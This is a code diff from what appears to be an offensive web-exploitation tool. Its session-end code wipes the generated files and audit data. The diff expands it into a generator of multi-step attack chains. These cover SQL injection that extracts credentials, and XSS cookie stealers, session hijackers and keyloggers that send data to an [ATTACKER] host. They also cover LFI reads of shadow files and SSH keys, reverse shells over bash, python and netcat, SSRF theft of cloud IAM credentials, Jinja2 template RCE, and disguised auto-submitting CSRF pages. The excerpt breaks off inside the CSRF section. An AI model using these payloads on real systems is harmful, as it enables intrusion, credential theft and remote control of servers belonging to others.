+    """Display recent audit trail entries."""
+    entries = audit.get_live_feed(last_n=15)
+    stats = audit.get_stats()
+    if not entries:
+        info("No audit entries yet.")
+        return
+    print(f"\n  {B}Live Audit Feed{N} (session: {stats['session_id']})")
+    print(f"  {D}Duration: {stats['duration_seconds']}s | "
+          f"Executions: {stats['executions']} | "
+          f"Alerts: {stats['alerts']}{N}")
+    print(f"  {'─' * 60}")
+    for e in entries:
+        risk_tag = ""
+        if e.get("risk") in ("HIGH", "CRITICAL"):
+            risk_tag = f" {R}[{e['risk']}]{N}"
+        elif e.get("risk"):
+            risk_tag = f" {Y}[{e['risk']}]{N}"
+        status = ""
+        if e.get("success") is True:
+            status = f" {G}OK{N}"
+        elif e.get("success") is False:
+            status = f" {R}FAIL{N}"
+        print(f"  [{e['ts_iso']}] {e['action']:14s}{risk_tag} "
+              f"{e.get('detail', '')[:40]}{status}")
+    print()
+
+
+def _walkthrough_session_end(file_mgr: ExploitFileManager,
+                             audit: AuditTrail,
+                             executor: SafeExecutor,
+                             findings_summary: list):
+    """End-of-session: show stats, offer report, then wipe everything."""
+    print()
+    heading("Session Complete")
+    stats = audit.get_stats()
+    print(f"  {B}Session ID:{N}      {stats['session_id']}")
+    print(f"  {B}Duration:{N}        {stats['duration_seconds']}s")
+    print(f"  {B}Commands run:{N}    {stats['executions']} "
+          f"({stats['successes']} ok, {stats['failures']} fail)")
+    print(f"  {B}Steps skipped:{N}   {stats['skips']}")
+    print(f"  {B}Files generated:{N} {stats['files_generated']}")
+    print(f"  {B}Custom commands:{N} {stats['edits']}")
+    print(f"  {B}High-risk alerts:{N} {stats['alerts']}")
+    print(f"  {B}Vuln types:{N}      {', '.join(stats['vuln_types_tested'])}")
+    print()
+
+    alerts = audit.get_alerts()
+    if alerts:
+        print(f"  {R}High-Risk Alerts:{N}")
+        for a in alerts[:5]:
+            print(f"    [{a['ts_iso']}] {a['action']}: {a.get('detail', '')[:50]}")
+        print()
+
+    # Offer report export
+    if confirm("Generate session report?"):
+        fmt = prompt("Format (text/json)", "text").lower()
+        if fmt not in ("text", "json"):
+            fmt = "text"
+        report_content = ReportGenerator.generate(
+            audit, file_mgr, fmt=fmt,
+            findings_summary=findings_summary,
+        )
+        report_path = ReportGenerator.save_report(
+            report_content, file_mgr, fmt=fmt,
+        )
+        ok(f"Report saved: {report_path.name} (ephemeral, auto-wipes)")
+        print()
+
+        if confirm("Display report now?"):
+            print()
+            print(report_content)
+            print()
+
+    # Session cleanup
+    _walkthrough_cleanup(file_mgr, audit, executor)
+
+
+def _walkthrough_cleanup(file_mgr: ExploitFileManager,
+                         audit: AuditTrail,
+                         executor: SafeExecutor):
+    """Securely destroy all session data."""
+    print()
+    tracked = file_mgr.list_files()
+    if tracked:
+        active = [f for f in tracked if f["exists"]]
+        if active:
+            info(f"Wiping {len(active)} ephemeral file(s)...")
+            wiped = file_mgr.wipe_all()
+            ok(f"Securely wiped {wiped} file(s)")
+
+    audit.log("session_destroy", "full_cleanup")
+    audit.session_destroy()
+    file_mgr.session_destroy()
+    ok("Session data destroyed — no traces remain in memory.")
+    info("Run Intel mode 7 (Wipe Intel Data) to erase scan results and reports.")
 
 
 def _build_exploit_steps(etype: str, param: str, ei: dict,
                          test_url: str, base_url: str, sp: str) -> list:
-    """Build actionable step-by-step exploit commands for a finding."""
+    """Build comprehensive exploit steps with automated payloads.
+
+    Each exploit type gets a full multi-step chain:
+    1. Confirmation/detection step
+    2. Escalation steps with increasing severity
+    3. Automated file generation for client-side attacks
+    4. Data extraction/exfiltration steps where applicable
+
+    Supports variable substitution: [TARGET_URL], [ATTACKER], [PARAM]
+    are replaced at runtime with user-provided values.
+    """
     target = test_url if test_url and test_url != "[TARGET]" else base_url
     path = ei.get("path", "")
+    target_base = target.split("?")[0] if "?" in target else target
     steps = []
 
     if etype == "sqli":
         steps = [
-            {"title": "Confirm SQL injection",
+            {"title": "Confirm SQL injection (error-based)",
              "command": f"curl -s {sp} \"{target}\"",
-             "note": "Look for SQL error messages in the response"},
-            {"title": "Extract database version",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT version()-- -\"",
-             "note": "Response should contain the DB version string"},
+             "note": "Look for SQL error messages (syntax error, mysql_fetch, "
+                     "ORA-, SQLSTATE) in the response"},
+            {"title": "Detect database type",
+             "command": (
+                 f"echo '=== MySQL ===' && curl -s {sp} \"{target_base}?{param}=' UNION SELECT version()-- -\" | head -5 && "
+                 f"echo '=== PostgreSQL ===' && curl -s {sp} \"{target_base}?{param}=' UNION SELECT version()-- -\" | head -5 && "
+                 f"echo '=== SQLite ===' && curl -s {sp} \"{target_base}?{param}=' UNION SELECT sqlite_version()-- -\" | head -5"
+             ),
+             "note": "Identifies backend DB engine from version() response"},
+            {"title": "Determine column count (ORDER BY)",
+             "command": (
+                 f"for i in $(seq 1 10); do echo \"=== ORDER BY $i ===\"; "
+                 f"curl -s {sp} \"{target_base}?{param}=' ORDER BY $i-- -\" | head -2; done"
+             ),
+             "note": "Last successful ORDER BY N = N columns in query"},
+            {"title": "Extract database version (UNION)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT version()-- -\"",
+             "note": "DB version string confirms exploitation"},
             {"title": "List all databases",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -\"",
-             "warning": "This queries the target database"},
+             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -\"",
+             "warning": "Enumerates all databases on the server"},
             {"title": "List tables in current database",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -\"",
-             "warning": "This enumerates database tables"},
-            {"title": "Extract credentials (example)",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT group_concat(username,0x3a,password) FROM users-- -\"",
-             "warning": "This attempts to read user credentials"},
+             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -\"",
+             "warning": "Enumerates all tables"},
+            {"title": "List columns of users table",
+             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -\"",
+             "warning": "Maps user table structure"},
+            {"title": "Extract credentials",
+             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(username,0x3a,password) FROM users-- -\"",
+             "warning": "Extracts user credentials from database",
+             "risk": "HIGH"},
+            {"title": "Boolean-based blind confirmation",
+             "command": (
+                 f"echo '=== TRUE condition ===' && curl -s {sp} \"{target_base}?{param}=' AND 1=1-- -\" | wc -c && "
+                 f"echo '=== FALSE condition ===' && curl -s {sp} \"{target_base}?{param}=' AND 1=2-- -\" | wc -c"
+             ),
+             "note": "Different response sizes = blind SQLi confirmed"},
+            {"title": "Time-based blind confirmation",
+             "command": f"time curl -s {sp} \"{target_base}?{param}=' AND SLEEP(5)-- -\" > /dev/null",
+             "note": "5+ second response time = time-based blind SQLi confirmed"},
         ]
+
     elif etype == "xss":
+        tag = secrets.token_hex(4)
         xss_phish_html = (
-            f"<!DOCTYPE html>\n<html>\n<body>\n"
-            f"<h2>XSS Phishing PoC</h2>\n"
-            f"<p>Send the victim this link:</p>\n"
-            f"<pre>{target.split('?')[0]}?{param}=&lt;script&gt;document.body.innerHTML="
-            f"'&lt;h1&gt;Session Expired&lt;/h1&gt;&lt;form action=https://ATTACKER/phish&gt;"
-            f"&lt;input name=user placeholder=Username&gt;&lt;input name=pass type=password "
-            f"placeholder=Password&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'"
-            f"&lt;/script&gt;</pre>\n"
-            f"<h3>What happens:</h3>\n<ol>\n"
-            f"<li>Victim clicks the link</li>\n"
-            f"<li>XSS replaces the page with a fake login form</li>\n"
-            f"<li>Victim enters credentials, sent to ATTACKER</li>\n</ol>\n"
-            f"</body>\n</html>"
+            f"<!DOCTYPE html>\n<html>\n<head><title>Security Check</title></head>\n"
+            f"<body style='margin:0;font-family:Arial,sans-serif;background:#f5f5f5'>\n"
+            f"<div style='max-width:500px;margin:80px auto;padding:40px;"
+            f"background:white;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)'>\n"
+            f"  <h2 style='color:#333'>XSS Phishing PoC — Attack Chain</h2>\n"
+            f"  <p><strong>Vulnerable URL:</strong></p>\n"
+            f"  <code style='display:block;padding:10px;background:#f0f0f0;"
+            f"border-radius:4px;word-break:break-all'>"
+            f"{target_base}?{param}=&lt;script&gt;...&lt;/script&gt;</code>\n"
+            f"  <h3>Attack Flow:</h3>\n"
+            f"  <ol>\n"
+            f"    <li>Attacker crafts URL with XSS payload</li>\n"
+            f"    <li>Victim clicks link (phishing email/message)</li>\n"
+            f"    <li>XSS replaces page content with fake login form</li>\n"
+            f"    <li>Victim enters credentials</li>\n"
+            f"    <li>Credentials sent to attacker's server</li>\n"
+            f"  </ol>\n"
+            f"  <h3>Payloads:</h3>\n"
+            f"  <h4>Cookie Stealer:</h4>\n"
+            f"  <code style='display:block;padding:8px;background:#fff3f3;border-radius:4px;"
+            f"word-break:break-all'>&lt;script&gt;new Image().src='https://[ATTACKER]/c?c='"
+            f"+document.cookie&lt;/script&gt;</code>\n"
+            f"  <h4>Session Hijack:</h4>\n"
+            f"  <code style='display:block;padding:8px;background:#fff3f3;border-radius:4px;"
+            f"word-break:break-all'>&lt;script&gt;fetch('https://[ATTACKER]/s',{{method:'POST',"
+            f"body:JSON.stringify({{c:document.cookie,l:location.href,ls:localStorage}})}})&lt;/script&gt;</code>\n"
+            f"  <h4>Keylogger:</h4>\n"
+            f"  <code style='display:block;padding:8px;background:#fff3f3;border-radius:4px;"
+            f"word-break:break-all'>&lt;script&gt;document.onkeypress=function(e){{"
+            f"new Image().src='https://[ATTACKER]/k?k='+e.key}}&lt;/script&gt;</code>\n"
+            f"</div>\n</body>\n</html>"
         )
         steps = [
-            {"title": "Confirm reflection",
-             "command": f"curl -s {sp} \"{target}\" | grep -i '<script\\|alert\\|onerror'",
+            {"title": "Confirm payload reflection",
+             "command": f"curl -s {sp} \"{target}\" | grep -i '<script\\|alert\\|onerror\\|{tag}'",
              "note": "Check if payload appears unescaped in response"},
-            {"title": "Test cookie stealing payload",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=<script>new Image().src='https://ATTACKER/c?c='+document.cookie</script>\"",
-             "note": "Replace ATTACKER with your listener IP/domain",
+            {"title": "Test basic alert payload",
+             "command": f"curl -s {sp} \"{target_base}?{param}=<script>alert('{tag}')</script>\"",
+             "note": f"Look for unescaped <script>alert('{tag}')</script> in response"},
+            {"title": "Test event handler payload (img onerror)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=<img src=x onerror=alert('{tag}')>\"",
+             "note": "Alternative XSS via event handler — bypasses some script filters"},
+            {"title": "Test SVG payload (filter bypass)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=<svg onload=alert('{tag}')>\"",
+             "note": "SVG onload bypasses many input filters"},
+            {"title": "Cookie stealing payload",
+             "command": (
+                 f"curl -s {sp} \"{target_base}?{param}="
+                 f"<script>new Image().src='https://[ATTACKER]/c?c='+document.cookie</script>\""
+             ),
+             "note": "Replace [ATTACKER] with your listener IP/domain",
              "warning": "This payload steals session cookies"},
-            {"title": "Generate XSS phishing documentation",
+            {"title": "DOM data exfiltration payload",
+             "command": (
+                 f"curl -s {sp} \"{target_base}?{param}="
+                 f"<script>fetch('https://[ATTACKER]/s',{{method:'POST',"
+                 f"body:JSON.stringify({{c:document.cookie,u:location.href,"
+                 f"ls:JSON.stringify(localStorage)}})}});</script>\""
+             ),
+             "note": "Exfiltrates cookies, URL, and localStorage",
+             "warning": "Full session data theft"},
+            {"title": "Generate XSS phishing attack page",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"xss_phish_{secrets.token_hex(3)}.html",
                  "content": xss_phish_html,
-                 "note": "Reference page showing how to chain XSS into credential phishing.",
+                 "note": "Complete XSS attack chain documentation with multiple "
+                         "payload options (cookie steal, session hijack, keylogger).",
              },
-             "note": "Shows the full XSS phishing attack chain"},
+             "note": "Full attack chain reference with payload variants"},
         ]
+
     elif etype == "stored_xss":
         render = ei.get("render_path", "/")
+        stored_xss_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>Stored XSS PoC</h2>\n"
+            f"<p><strong>Inject point:</strong> {target}</p>\n"
+            f"<p><strong>Render point:</strong> {base_url.rstrip('/')}{render}</p>\n"
+            f"<h3>Payload Options:</h3>\n"
+            f"<pre>Cookie stealer:\n"
+            f"&lt;script&gt;new Image().src='https://[ATTACKER]/c?c='+document.cookie&lt;/script&gt;\n\n"
+            f"BeEF hook:\n"
+            f"&lt;script src='https://[ATTACKER]/hook.js'&gt;&lt;/script&gt;\n\n"
+            f"Persistent keylogger:\n"
+            f"&lt;script&gt;document.onkeypress=function(e){{"
+            f"fetch('https://[ATTACKER]/k?k='+e.key)}}&lt;/script&gt;\n</pre>\n"
+            f"</body></html>"
+        )
         steps = [
-            {"title": "Inject persistent payload",
-             "command": f"curl -s {sp} -X POST -d \"{param}=<script>document.location='https://ATTACKER/c?c='+document.cookie</script>\" \"{target}\"",
-             "warning": "This injects a persistent payload into the application"},
-            {"title": "Verify payload persists",
+            {"title": "Inject persistent cookie-stealing payload",
+             "command": (
+                 f"curl -s {sp} -X POST -d \"{param}="
+                 f"<script>new Image().src='https://[ATTACKER]/c?c='+document.cookie</script>\" "
+                 f"\"{target}\""
+             ),
+             "warning": "Injects a persistent payload into the application"},
+            {"title": "Inject persistent keylogger payload",
+             "command": (
+                 f"curl -s {sp} -X POST -d \"{param}="
+                 f"<script>document.onkeypress=function(e){{"
+                 f"fetch('https://[ATTACKER]/k?k='+e.key)}}</script>\" "
+                 f"\"{target}\""
+             ),
+             "warning": "Injects persistent keylogger — captures all keystrokes",
+             "risk": "CRITICAL"},
+            {"title": "Verify payload renders on target page",
              "command": f"curl -s {sp} \"{base_url.rstrip('/')}{render}\" | grep -i 'ATTACKER\\|script'",
              "note": "Check if the payload appears on the render page"},
+            {"title": "Generate stored XSS attack documentation",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"stored_xss_{secrets.token_hex(3)}.html",
+                 "content": stored_xss_html,
+                 "note": "Reference document with inject/render points and payload options.",
+             }},
         ]
+
     elif etype == "lfi":
+        lfi_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>LFI Exploitation PoC</h2>\n"
+            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
+            f"<p><strong>Parameter:</strong> {param}</p>\n"
+            f"<h3>Payload Reference:</h3>\n"
+            f"<table border='1' cellpadding='5'>\n"
+            f"<tr><th>Target</th><th>Payload</th></tr>\n"
+            f"<tr><td>/etc/passwd</td><td>../../../../../../etc/passwd</td></tr>\n"
+            f"<tr><td>/etc/shadow</td><td>../../../../../../etc/shadow</td></tr>\n"
+            f"<tr><td>SSH keys</td><td>../../../../../../root/.ssh/id_rsa</td></tr>\n"
+            f"<tr><td>PHP source</td><td>php://filter/convert.base64-encode/resource=index</td></tr>\n"
+            f"<tr><td>Proc self</td><td>/proc/self/environ</td></tr>\n"
+            f"<tr><td>Apache log</td><td>/var/log/apache2/access.log</td></tr>\n"
+            f"<tr><td>Nginx log</td><td>/var/log/nginx/access.log</td></tr>\n"
+            f"<tr><td>AWS creds</td><td>../../../../../../home/ubuntu/.aws/credentials</td></tr>\n"
+            f"</table>\n"
+            f"<h3>Log Poisoning (LFI to RCE):</h3>\n"
+            f"<pre>1. Inject PHP into User-Agent:\n"
+            f"   curl -A '&lt;?php system($_GET[\"cmd\"]); ?&gt;' {target_base}\n"
+            f"2. Include the log file:\n"
+            f"   {target_base}?{param}=/var/log/apache2/access.log&amp;cmd=id</pre>\n"
+            f"</body></html>"
+        )
         steps = [
             {"title": "Read /etc/passwd",
              "command": f"curl -s {sp} \"{target}\"",
              "note": "Look for root:x:0:0: in output"},
+            {"title": "Read /etc/shadow (if readable)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=../../../../../../etc/shadow\"",
+             "warning": "Attempts to read password hashes",
+             "note": "Usually requires root — but misconfigurations happen"},
             {"title": "Read application config",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=../../../var/www/html/config.php\""},
-            {"title": "Read source via PHP filter",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=php://filter/convert.base64-encode/resource=index\" | base64 -d",
-             "note": "Decodes PHP source code"},
+             "command": f"curl -s {sp} \"{target_base}?{param}=../../../var/www/html/config.php\"",
+             "note": "Look for DB credentials, API keys, secrets"},
+            {"title": "Read source via PHP filter (base64)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=php://filter/convert.base64-encode/resource=index\" | base64 -d",
+             "note": "Decodes PHP source code — reveals application logic"},
+            {"title": "Read /proc/self/environ (env variables)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=/proc/self/environ\"",
+             "note": "May reveal API keys, DB passwords, AWS credentials",
+             "warning": "Reads process environment variables"},
             {"title": "Read SSH private key",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=../../../root/.ssh/id_rsa\"",
-             "warning": "Attempts to read server SSH key"},
+             "command": f"curl -s {sp} \"{target_base}?{param}=../../../../../../root/.ssh/id_rsa\"",
+             "warning": "Attempts to read server SSH key",
+             "risk": "CRITICAL"},
+            {"title": "Attempt null byte bypass (legacy PHP)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=../../../../../../etc/passwd%00\"",
+             "note": "Null byte terminates appended extensions (PHP < 5.3.4)"},
+            {"title": "Attempt double encoding bypass",
+             "command": f"curl -s {sp} \"{target_base}?{param}=%252e%252e%252f%252e%252e%252fetc%252fpasswd\"",
+             "note": "Double URL encoding bypasses single-decode filters"},
+            {"title": "Generate LFI payload reference",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"lfi_payloads_{secrets.token_hex(3)}.html",
+                 "content": lfi_html,
+                 "note": "Comprehensive LFI payload reference with log poisoning guide.",
+             }},
         ]
+
     elif etype == "command_injection":
+        cmdi_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>Command Injection PoC</h2>\n"
+            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
+            f"<p><strong>Parameter:</strong> {param}</p>\n"
+            f"<h3>Payloads:</h3>\n"
+            f"<table border='1' cellpadding='5'>\n"
+            f"<tr><th>Separator</th><th>Payload</th><th>Notes</th></tr>\n"
+            f"<tr><td>Semicolon</td><td>;id</td><td>Unix chain</td></tr>\n"
+            f"<tr><td>Pipe</td><td>|id</td><td>Pipe output</td></tr>\n"
+            f"<tr><td>AND</td><td>&amp;&amp;id</td><td>Conditional exec</td></tr>\n"
+            f"<tr><td>Backtick</td><td>`id`</td><td>Subshell</td></tr>\n"
+            f"<tr><td>$() subshell</td><td>$(id)</td><td>POSIX subshell</td></tr>\n"
+            f"<tr><td>Newline</td><td>%0aid</td><td>URL encoded newline</td></tr>\n"
+            f"</table>\n"
+            f"<h3>Reverse Shell Commands:</h3>\n"
+            f"<pre>bash -i >& /dev/tcp/[ATTACKER]/4444 0>&1\n"
+            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"[ATTACKER]\",4444));"
+            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n"
+            f"nc -e /bin/bash [ATTACKER] 4444</pre>\n"
+            f"</body></html>"
+        )
         steps = [
-            {"title": "Confirm command execution",
+            {"title": "Confirm command execution (id)",
              "command": f"curl -s {sp} \"{target}\"",
-             "note": "Look for command output (uid=, whoami result)"},
+             "note": "Look for uid=, whoami result, or command output"},
+            {"title": "Test semicolon separator",
+             "command": f"curl -s {sp} \"{target_base}?{param}=;id\"",
+             "note": "Unix command chain via semicolon"},
+            {"title": "Test pipe separator",
+             "command": f"curl -s {sp} \"{target_base}?{param}=|id\"",
+             "note": "Pipe operator — output of first command piped"},
+            {"title": "Test $() subshell",
+             "command": f"curl -s {sp} \"{target_base}?{param}=$(id)\"",
+             "note": "POSIX subshell execution"},
             {"title": "Read /etc/passwd",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=;cat /etc/passwd\""},
-            {"title": "Get reverse shell (example)",
-             "command": f"# curl -s {sp} \"{target.split('?')[0]}?{param}=;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\"",
-             "warning": "This would open a reverse shell. Replace ATTACKER/4444.",
-             "note": "Set up listener first: nc -lvnp 4444"},
+             "command": f"curl -s {sp} \"{target_base}?{param}=;cat /etc/passwd\"",
+             "warning": "Reads system user file"},
+            {"title": "Enumerate system info",
+             "command": (
+                 f"curl -s {sp} \"{target_base}?{param}="
+                 f";echo '===UNAME===' && uname -a && echo '===WHOAMI===' && whoami"
+                 f" && echo '===PWD===' && pwd\""
+             ),
+             "note": "Gathers OS, user, and directory info"},
+            {"title": "Check for outbound connectivity",
+             "command": f"curl -s {sp} \"{target_base}?{param}=;curl -s https://ifconfig.me\"",
+             "note": "If output = IP, the server can make outbound requests (reverse shell possible)"},
+            {"title": "Reverse shell setup (example — COMMENTED)",
+             "command": (
+                 f"# Set up listener first: nc -lvnp 4444\n"
+                 f"# curl -s {sp} \"{target_base}?{param}="
+                 f";bash -c 'bash -i >& /dev/tcp/[ATTACKER]/4444 0>&1'\""
+             ),
+             "warning": "Opens a reverse shell. Replace [ATTACKER]/4444 with your listener.",
+             "risk": "CRITICAL",
+             "note": "Listener: nc -lvnp 4444"},
+            {"title": "Generate command injection payload reference",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"cmdi_payloads_{secrets.token_hex(3)}.html",
+                 "content": cmdi_html,
+                 "note": "Command injection payload reference with reverse shell examples.",
+             }},
         ]
+
     elif etype == "ssrf":
+        ssrf_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>SSRF Exploitation PoC</h2>\n"
+            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
+            f"<p><strong>Parameter:</strong> {param}</p>\n"
+            f"<h3>Cloud Metadata Endpoints:</h3>\n"
+            f"<table border='1' cellpadding='5'>\n"
+            f"<tr><th>Provider</th><th>URL</th></tr>\n"
+            f"<tr><td>AWS IMDSv1</td><td>http://169.254.169.254/latest/meta-data/</td></tr>\n"
+            f"<tr><td>AWS IAM creds</td><td>http://169.254.169.254/latest/meta-data/iam/security-credentials/</td></tr>\n"
+            f"<tr><td>GCP</td><td>http://metadata.google.internal/computeMetadata/v1/</td></tr>\n"
+            f"<tr><td>Azure</td><td>http://169.254.169.254/metadata/instance?api-version=2021-02-01</td></tr>\n"
+            f"<tr><td>DigitalOcean</td><td>http://169.254.169.254/metadata/v1/</td></tr>\n"
+            f"</table>\n"
+            f"<h3>Internal Network Scan:</h3>\n"
+            f"<pre>Common targets: 192.168.1.1, 10.0.0.1, 172.16.0.1\n"
+            f"Redis: http://127.0.0.1:6379\n"
+            f"Elasticsearch: http://127.0.0.1:9200\n"
+            f"Docker API: http://127.0.0.1:2375</pre>\n"
+            f"</body></html>"
+        )
         steps = [
-            {"title": "Read cloud metadata",
+            {"title": "Read cloud metadata (AWS IMDSv1)",
              "command": f"curl -s {sp} \"{target}\"",
              "note": "Look for ami-id, instance-id, security-credentials"},
-            {"title": "Read IAM credentials",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
-             "warning": "This reads cloud IAM credentials"},
+            {"title": "List IAM roles",
+             "command": f"curl -s {sp} \"{target_base}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"",
+             "warning": "Lists cloud IAM roles"},
+            {"title": "Extract IAM credentials",
+             "command": f"curl -s {sp} \"{target_base}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]\"",
+             "warning": "Extracts cloud IAM credentials",
+             "risk": "CRITICAL",
+             "note": "Replace [ROLE_NAME] with role from previous step"},
+            {"title": "Check GCP metadata",
+             "command": f"curl -s {sp} \"{target_base}?{param}=http://metadata.google.internal/computeMetadata/v1/instance/\"",
+             "note": "Requires Metadata-Flavor header — may fail via SSRF"},
+            {"title": "Probe internal Redis (port 6379)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=http://127.0.0.1:6379/info\"",
+             "note": "Redis info — if present, can lead to RCE via SSRF"},
+            {"title": "Probe internal Elasticsearch (port 9200)",
+             "command": f"curl -s {sp} \"{target_base}?{param}=http://127.0.0.1:9200/_cat/indices\"",
+             "note": "Lists all Elasticsearch indices"},
             {"title": "Scan internal network",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=http://192.168.1.1/\"",
-             "note": "Probe internal hosts/services"},
+             "command": (
+                 f"for ip in 127.0.0.1 192.168.1.1 10.0.0.1 172.16.0.1; do "
+                 f"echo \"=== $ip ===\"; curl -s --max-time 3 {sp} "
+                 f"\"{target_base}?{param}=http://$ip/\" | head -3; done"
+             ),
+             "note": "Scans common internal IPs for live services"},
+            {"title": "Generate SSRF payload reference",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"ssrf_payloads_{secrets.token_hex(3)}.html",
+                 "content": ssrf_html,
+                 "note": "SSRF payload reference for cloud metadata and internal scanning.",
+             }},
         ]
+
     elif etype == "ssti":
+        ssti_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>SSTI Exploitation PoC</h2>\n"
+            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
+            f"<h3>Detection Payloads:</h3>\n"
+            f"<pre>{{{{7*7}}}} -> 49 (Jinja2/Twig)\n"
+            f"${{7*7}} -> 49 (Freemarker/Velocity)\n"
+            f"#{{7*7}} -> 49 (Thymeleaf)\n"
+            f"<%= 7*7 %> -> 49 (ERB/EJS)</pre>\n"
+            f"<h3>Jinja2 RCE Chain:</h3>\n"
+            f"<pre>{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\n"
+            f"{{{{''.__class__.__mro__[1].__subclasses__()}}}}\n"
+            f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}}}</pre>\n"
+            f"</body></html>"
+        )
         steps = [
-            {"title": "Confirm template evaluation",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}={{{{7*7}}}}\" | grep 49",
+            {"title": "Confirm template evaluation (7*7=49)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={{{{7*7}}}}\" | grep 49",
              "note": "49 in response = server evaluated the expression"},
-            {"title": "Read /etc/passwd (Jinja2)",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}={{{{''.__class__.__mro__[1].__subclasses__()}}}}\"",
+            {"title": "Test alternative engine (${{7*7}})",
+             "command": f"curl -s {sp} \"{target_base}?{param}=${{7*7}}\"",
+             "note": "Tests Freemarker/Velocity/EL syntax"},
+            {"title": "List Python classes (Jinja2)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={{{{''.__class__.__mro__[1].__subclasses__()}}}}\"",
              "note": "Lists available Python classes for RCE chain"},
-            {"title": "Execute OS command (Jinja2)",
-             "command": f"# curl -s {sp} \"{target.split('?')[0]}?{param}={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\"",
-             "warning": "This executes OS commands on the server"},
+            {"title": "Read /etc/passwd via os.popen (Jinja2)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={{{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}}}\"",
+             "warning": "Reads /etc/passwd via template-based RCE",
+             "risk": "CRITICAL"},
+            {"title": "Execute OS command (Jinja2 — id)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\"",
+             "warning": "Executes OS commands on the server",
+             "risk": "CRITICAL"},
+            {"title": "Generate SSTI payload reference",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"ssti_payloads_{secrets.token_hex(3)}.html",
+                 "content": ssti_html,
+                 "note": "SSTI detection and exploitation reference for multiple engines.",
+             }},
         ]
+
     elif etype == "csrf":
-        csrf_html = (
+        csrf_simple = (
             f"<html>\n<body onload=\"document.getElementById('f').submit();\">\n"
             f"<h2>Processing... please wait</h2>\n"
             f"<form method='POST' action='{target}' id='f' style='display:none'>\n"
             f"  <input type='hidden' name='{param}' value='attacker_controlled_value'>\n"
             f"</form>\n</body>\n</html>"
         )
+        csrf_advanced = (
+            f"<!DOCTYPE html>\n<html>\n<head><title>Loading...</title></head>\n"
+            f"<body style='font-family:Arial;text-align:center;padding-top:100px'>\n"
+            f"<h2>Please wait while we verify your account...</h2>\n"
+            f"<div id='spinner' style='font-size:48px'>Loading</div>\n"
+            f"<iframe name='csrfFrame' style='display:none'></iframe>\n"
+            f"<form method='POST' action='{target}' id='csrfForm' target='csrfFrame' style='display:none'>\n"
+            f"  <input type='hidden' name='{param}' value='attacker_controlled_value'>\n"
+            f"</form>\n"
+            f"<script>\n"
+            f"document.getElementById('csrfForm').submit();\n"
+            f"setTimeout(function(){{ document.getElementById('spinner').textContent = "
+            f"'Verified! Redirecting...'; setTimeout(function(){{ window.location = "
+            f"'{base_url}'; }}, 1500); }}, 2000);\n"
+            f"</script>\n</body>\n</html>"
+        )
         steps = [
-            {"title": "Generate CSRF exploit page",
+            {"title": "Check for CSRF token in target form",
